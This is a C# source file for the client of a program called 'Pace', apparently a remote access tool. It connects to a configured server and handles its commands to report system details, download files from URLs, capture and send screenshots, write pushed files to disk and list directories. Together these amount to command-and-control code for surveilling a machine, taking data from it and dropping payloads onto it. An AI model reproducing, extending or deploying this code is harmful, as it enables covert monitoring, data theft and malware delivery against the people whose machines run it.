using Pace.Client.Configuration;
using Pace.Client.System;
using Pace.Client.Web;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using Pace.Common.Network.Packets.Server;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Pace.Client
{
    class Program
    {
        private PaceClient client;
        private bool isRunning;

        static void Main(string[] args) => new Program().Run();

        private void Run()
        {
            client = new PaceClient();
            client.PacketReceived += Client_PacketReceived;
            client.PacketSent += Client_PacketSent;

            PrintDebug("Waiting for Server...");

            while (!client.TcpClient.Connected)
            {
                try
                {
                    client.Connect(IPAddress.Parse(ClientConfiguration.Host), ClientConfiguration.Port);
                }
                catch (Exception)
                {
                    continue;
                }
            }

            PrintDebug("Connected!");

            var packetChannel = new PacketChannel();

            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>((packet) =>
            {
                var systemInfo = SystemInformation.Get();

                var clientAddress = client.TcpClient.Client.LocalEndPoint.ToString().Split(':');

                var infoPacket = new GetSystemInfoResponsePacket(
                    ClientConfiguration.Identifier,
                    clientAddress[0],
                    int.Parse(clientAddress[1]),
                    systemInfo.UserName,
                    systemInfo.ComputerName,
                    systemInfo.OperatingSystem
                );

                client.SendPacket(infoPacket);
            });

            packetChannel.RegisterHandler<DownloadFileRequestPacket>((packet) =>
            {
                var downloadFilePacket = (DownloadFileRequestPacket)packet;
                new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
            });

            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>((packet) =>
            {
                var screenshot = ScreenCapture.CaptureScreen();

                byte[] screenshotBytes = ScreenCapture.ImageToBytes(screenshot);

                var screenshotResponsePacket = new TakeScreenshotResponsePacket(screenshotBytes);

                client.SendPacket(screenshotResponsePacket);
            });

            packetChannel.RegisterHandler<SendFileRequestPacket>((packet) =>
            {
                var sendFilePacket = (SendFileRequestPacket)packet;
                File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
            });

            packetChannel.RegisterHandler<GetDirectoryRequestPacket>((packet) =>
            {
                var getDirectoryPacket = (GetDirectoryRequestPacket)packet;

                var response = new GetDirectoryResponsePacket
                {
                    Folders = FileExplorer.GetDirectories(getDirectoryPacket.Path),
                    Files = FileExplorer.GetFiles(getDirectoryPacket.Path)
                };

                client.SendPacket(response);
            });

            isRunning = true;

            while (isRunning)
            {
                try
                {
                    var packet = client.ReadPacket();

                    packetChannel.HandlePacket(packet);
                }
                catch (IOException ex)
                {
                    if (ex.InnerException == null)
                    {
                        throw ex;
                    }

                    if (ex.InnerException.GetType() == typeof(SocketException))
                    {
                        var socketException = (ex.InnerException as SocketException);

                        if (socketException.ErrorCode == (int)SocketError.ConnectionReset)
                        {
                            PrintDebug("Disconnected!");
                        }
                    }

                    isRunning = false;
                }
            }

            Console.ReadKey();
        }

        private void Client_PacketReceived(object sender, EventArgs e)
        {
            PrintDebug("Packet received.");
        }

        private void Client_PacketSent(object sender, EventArgs e)
        {
            PrintDebug("Packet sent.");
        }

        public void PrintDebug(string message)
        {
            Console.WriteLine($"[DEBUG]: {message}");
        }
    }
}